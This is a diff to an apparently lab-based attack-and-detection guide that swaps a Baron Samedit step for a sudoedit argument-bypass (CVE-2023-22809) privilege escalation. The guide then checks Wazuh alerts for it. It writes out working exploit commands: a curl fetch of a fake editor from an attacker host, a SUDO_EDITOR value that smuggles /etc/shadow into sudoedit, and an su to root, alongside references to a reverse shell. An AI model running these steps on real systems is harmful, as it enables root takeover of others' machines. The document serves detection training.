@@ -146,63 +146,52 @@ You should see **"ExifTool spawning shell"** or **"DjVu file processing"** alert
 
 ---
 
-## 3. Baron Samedit Privilege Escalation (Phase 3)
+## 3. sudoedit Argument Bypass Privilege Escalation (Phase 3)
 
 **Target:** `git` user on GitLab → escalate to `root`
-**CVE:** CVE-2021-3156
+**CVE:** CVE-2023-22809 (sudoedit `--` separator bypass)
 **Run from:** The reverse shell opened in Phase 2
 
-### Transfer the Exploit
+**Why this works on this target:** GitLab's admin granted the `git` user a
+narrow, passwordless `sudoedit` rule for a single file
+(`/etc/gitlab/trusted.conf`). CVE-2023-22809 breaks that restriction —
+the attacker smuggles `/etc/shadow` into the editor's file list via
+`SUDO_EDITOR="<editor> -- /etc/shadow"`, rewrites root's password hash,
+and logs in as root with `su`.
 
-**Terminal 2 (on attacker, get the base64-encoded exploit):**
+### Start the helper (serves the fake editor via HTTP)
+
+**Terminal 3 (attacker):**
 
 ```bash
-docker exec -it attacker /opt/scripts/03-baron-samedit.sh
+docker exec -it attacker /opt/scripts/03-sudoedit-bypass.sh
 ```
 
-This prints the commands you need to paste into the `git` user shell.
-Copy the entire `mkdir -p /tmp/exploit` ... `chmod +x` block.
+It prints a 4-line block — copy it.
 
 ### Run the Exploit
 
-**Terminal 1 (your `git` user reverse shell):**
-
-Paste the commands you copied. Then:
+**Terminal 1 (your `git` reverse shell from Phase 2):** paste the block:
 
 ```bash
-# Test if vulnerable (should print "Exit code: 139"):
-sudoedit -s '\' 2>/dev/null; echo "Exit code: $?"
-
-# Run the exploit:
-cd /tmp/exploit && python3 exploit_nss.py
+curl -s -o /tmp/fake_editor.sh http://172.26.0.10:8890/fake_editor.sh
+chmod +x /tmp/fake_editor.sh
+SUDO_EDITOR="/tmp/fake_editor.sh -- /etc/shadow" sudoedit /etc/gitlab/trusted.conf
+echo 'pwned123' | su -c '/bin/bash' root
 ```
 
 ### Verify Success
 
-If successful, you'll see:
-```
-[+] ROOT shell obtained!
-root@gitlab:/#
-```
-
-Verify with `id`:
-```bash
-id
-# uid=0(root) gid=0(root) groups=0(root)
-```
-
-**Note:** The simplified exploit in `exploit_nss.py` is best-effort. If it fails, clone worawit's full PoC:
-```bash
-# On attacker:
-cd /opt/exploits/baron-samedit
-git clone https://github.com/worawit/CVE-2021-3156.git worawit
-# Then transfer worawit/exploit_nss.py the same way
-```
+You'll see the shell prompt change from `git@gitlab:~$` to `root@gitlab:~#`.
+Confirm with `id` → `uid=0(root) gid=0(root) groups=0(root)`.
 
 ### Verify Detection
 
 In Wazuh Dashboard, filter by `rule.id: 100300 or rule.id: 100301 or rule.id: 100302`.
-You should see **"Baron Samedit exploitation attempt"** or **"Sudo/sudoedit crash detected"** alerts.
+You should see:
+- **"CVE-2023-22809 exploitation attempt: SUDO_EDITOR contains -- separator"** (100300)
+- **"sudoedit targeting a sensitive system file"** (100301)
+- **"Root session opened by git user"** (100302)
 
 **Keep this root shell open** — you need it for persistence.
 
